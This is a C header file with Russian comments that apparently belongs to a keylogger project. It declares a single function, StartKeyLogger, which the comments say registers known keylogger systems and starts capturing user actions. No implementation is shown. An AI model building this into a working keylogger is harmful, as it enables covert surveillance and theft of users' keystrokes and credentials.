//---------------------------------------------------------------------------
//
//  Модуль подключает некторые системы логирования действий пользователя
//
//---------------------------------------------------------------------------

#ifndef KeyLogSystemsH
#define KeyLogSystemsH
//---------------------------------------------------------------------------

#include "UniversalKeyLogger.h"

//-------------------------------------------------------------
//  StartKeyLogger - Функция регистрирует заранее известные
//					 системы кейлогера и запускает его
//-------------------------------------------------------------
void StartKeyLogger(PCHAR AppName);


//---------------------------------------------------------------------------
#endif
